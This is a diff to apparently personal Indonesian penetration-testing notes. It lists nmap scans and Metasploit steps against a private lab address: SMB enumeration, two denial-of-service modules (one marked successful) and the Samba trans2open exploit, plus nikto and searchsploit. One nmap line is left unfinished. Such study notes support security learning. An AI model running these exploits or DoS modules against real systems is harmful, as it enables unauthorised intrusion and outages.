@@ -21,7 +21,7 @@ nmap <iptarget> = lihat port terbuka
 
 contoh:
 $ nmap -oG - 192.168.1.0-255 -p 22 -vv > /home/cenovaxs/hasil = menscan 192.168.1.0 sampai 192.168.1.255 dengan port 22 hasil grabaple rapih kemudian disimpan di file bernama hasil
-
+$ nmap -p- -A 192.169.1.0 = 
 
 website recon yang recommended
 
@@ -61,3 +61,50 @@ hackertarget
 Bug bounty website
 hackerone.com
 bugcrowd.com
+
+Metasploit
+
+smb enumusers & version
+
+$ msfconsole
+msf6 > search <katakunci>                       Buat cari metaslpoit yang berhubungan
+msf6 > search smb 
+msf6 > use 95
+msf6 auxiliary(scanner/smb/smb_enumusers) > options             buat liat module options apa aja
+msf6 auxiliary(scanner/smb/smb_enumusers) > set RHOSTS <192.168.0.1>
+msf6 auxiliary(scanner/smb/smb_enumusers) > run
+msf6 auxiliary(scanner/smb/smb_enumusers) > use scanner/smb/smb_version                ganti ke smb_version
+msf6 auxiliary(scanner/smb/smb_version) > run                           buat lihat versi samba yang ada di server
+
+payload
+
+$ msfconsole
+msf6 > search tcp
+
+
+$ msfconsole
+msf6 > search openssl 0.9.8
+msf6 > use 1
+msf6 > auxiliary(dos/ssl/dtls_fragment_overflow) > set RHOSTS <192.168.0.75>
+msf6 > auxiliary(dos/ssl/dtls_fragment_overflow) > options
+msf6 > auxiliary(dos/ssl/dtls_fragment_overflow) > run                  kalau gagal dia gak ada efek apapun
+msf6 > auxiliary(dos/ssl/dtls_fragment_overflow) > exit
+
+karena gagal cari exploit lain :
+msf6 > search trans2open              trans2open bagian dari samba
+msf6 > use 1
+msf6 > exploit(linux/samba/trans2open) > set RHOSTS <192.168.0.75>
+msf6 > exploit(linux/samba/trans2open) > run
+
+karena gagal cari exploit lain :
+msf6 > search apache 2.2.14
+msf6 > use 0
+msf6 > auxiliary(dos/http/apache_mod_isapi) > set RHOSTS <192.168.0.75>
+msf6 > auxiliary(dos/http/apache_mod_isapi) > run               success
+
+
+Nikto > lihat outdated program dan sub program dan vurnerablitynya
+$ nikto -h <http://192.168.0.1>
+
+searchsploit
+$ searchsploit samba
